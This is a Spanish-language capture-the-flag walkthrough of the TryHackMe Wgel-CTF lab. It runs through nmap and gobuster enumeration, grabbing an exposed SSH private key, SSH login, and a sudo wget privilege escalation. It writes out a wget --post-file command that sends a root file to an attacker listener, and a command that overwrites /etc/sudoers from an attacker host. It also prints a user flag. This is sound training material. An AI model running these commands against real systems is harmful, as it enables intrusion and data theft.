### **Tutorial: Explotación de la máquina Wgel-CTF TryHackMe**

Este laboratorio muestra el proceso de reconocimiento, enumeración, acceso inicial y escalada de privilegios en una máquina vulnerable del laboratorio de TryHackMe.

## 1. Conexión a la VPN de TryHackMe

Para acceder a las máquinas del laboratorio es necesario conectarse previamente a la VPN de TryHackMe. Esto crea un túnel seguro entre la máquina Kali Linux y la red privada donde se encuentran los sistemas vulnerables.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali se ejecuta el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```

Si la conexión se establece correctamente aparecerá el siguiente mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la conexión VPN se ha realizado correctamente.
Si vemos que no funciona, probar otro archivo de configuración hasta que se vea conectado, en vez de central, poner west-3 importante.


## 2. Enumeración inicial – Escaneo con Nmap

En esta fase se realiza un reconocimiento inicial del objetivo para identificar los servicios expuestos y posibles vectores de ataque.

Se ejecuta el siguiente comando:

```bash
nmap -sC -sV 10.130.184.157
```

![nmap](Maquina_de_Linux/Wgel-CTF/imagenes/nmap.png)

Explicación de parámetros:
-sC → Ejecuta scripts básicos de Nmap
-sV → Detecta versiones de servicios
-oN → Guarda el resultado en un archivo


Resultados relevantes:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29


Análisis:
- Puerto 22 (SSH) → Posible acceso remoto
- Puerto 80 (HTTP) → Aplicación web (vector principal de ataque)


## 3. Enumeración web

Se accede al navegador:

```bash
http://10.130.184.157
```
![apache](Maquina_de_Linux/Wgel-CTF/imagenes/apache.png)

Se observa una página web  de apache sin información relevante. Vamos a mirar el código fuente haber si encontramos algo

Dentro encontramos este mensaje:

```bash
 <!-- Jessie don't forget to udate the webiste -->
 ```


### 3.1 Enumeración de directorios

Se utiliza Gobuster para descubrir rutas ocultas:

```bash
gobuster dir -u http://10.130.184.157 -w /usr/share/wordlists/dirb/common.txt
```

![gobuster](Maquina_de_Linux/Wgel-CTF/imagenes/gobuster.png)

Resultados:

```bash
http://10.130.184.157/sitemap/
```


## 4. Enumeración del directorio /sitemap

Tras descubrir el directorio /sitemap, se procede a acceder desde el navegador:

```bash
http://10.130.184.157/sitemap/
```

![nmap](Maquina_de_Linux/Wgel-CTF/imagenes/url.png)

Se observa una página con múltiples recursos internos del sitio web.

Para profundizar en la enumeración, se ejecuta nuevamente Gobuster:

```bash
gobuster dir -u http://10.130.184.157/sitemap -w /usr/share/wordlists/dirb/common.txt
```

![gobuster](Maquina_de_Linux/Wgel-CTF/imagenes/gobuster2.png)

Resultados:
- /.hta
- /.htaccess
- /.htpasswd
- /.ssh
- /css
- /fonts
- /images
- /index.html
- /js


## 5. Análisis de resultados

Se identifican varios directorios comunes como:

- /css, /js, /fonts → Archivos de estilo y scripts
- /index.html → Página interna

Sin embargo, hay un hallazgo especialmente importante:

```bash
/.ssh
```

## 6. Acceso al directorio .ssh

Se accede al siguiente recurso:

```bash
http://10.130.184.157/sitemap/.ssh/
```

![ssh](Maquina_de_Linux/Wgel-CTF/imagenes/ssh.png)

Este directorio es crítico, ya que normalmente contiene claves de acceso SSH.

Dentro se encuentra un archivo muy sensible:

```bash
id_rsa
```

## 7. Descarga de la clave privada

Descargamos la clave en nuestro ordenador

```bash
wget http://10.130.170.92/sitemap/.ssh/id_rsa
```

![nano](Maquina_de_Linux/Wgel-CTF/imagenes/wget.png)

Se ajustan los permisos para poder usarlo:

```bash
sudo chmod 600 id_rsa
```
![nano](Maquina_de_Linux/Wgel-CTF/imagenes/nano.png)


## 8. Acceso inicial mediante SSH

Gracias al comentario encontrado anteriormente en el código fuente:

```bash
<!-- Jessie don't forget to udate the webiste -->
```

Se deduce que el usuario del sistema es jessie.

Se realiza la conexión:

```bash
sudo ssh -i key jessie@10.130.184.157
```

![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/jessie.png)

Si todo es correcto, se obtiene acceso al sistema.


## 9. Estabilización de la sesión y reconocimiento interno

Una vez dentro del sistema, es recomendable comprobar el usuario actual:

```bash
whoami
```

Resultado:

jessie

También se puede verificar información del sistema:

```bash
uname -a
```

## 10. Obtención de la user flag

Tras acceder al sistema, se procede a buscar la flag del usuario dentro de su directorio personal:

```bash
cd /home/jessie
ls
```

En un primer momento no se observa el archivo user.txt, por lo que se continúa explorando los subdirectorios disponibles.

Se accede al directorio Documents:

```bash
cd Documents
ls
```

Se encuentra el archivo:

```bash
user_flag.txt
```

![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/whoami.png)

Se visualiza su contenido:

```bash
cat user_flag.txt
Resultado:
057c67131c3d5e42dd5cd3075b198ff6
```

## 11. Enumeración de privilegios

Una vez obtenida la user flag, el siguiente paso es comprobar si el usuario tiene permisos especiales que permitan escalar privilegios.

Se ejecuta:

```bash
sudo -l
```

![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/sudo.png)

Resultado:

```bash
(ALL) NOPASSWD: /usr/bin/wget
```

## 13. Análisis del vector de ataque

El binario wget permite realizar peticiones HTTP y manipular archivos remotos y locales. Al poder ejecutarse como root, puede ser utilizado para acceder a archivos sensibles del sistema.


## 14. Explotación

Se utiliza wget con privilegios elevados para acceder al contenido del archivo de root.

Se inicia un servidor/listener en la máquina atacante:

```bash
nc -lvp 4444
```

![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/nc.png)

Y desde la máquina víctima se ejecuta:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.142.53:4444/
```

![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/sudoo.png)

sudo /usr/bin/wget http://192.168.142.53/sudoers -O /etc/sudoers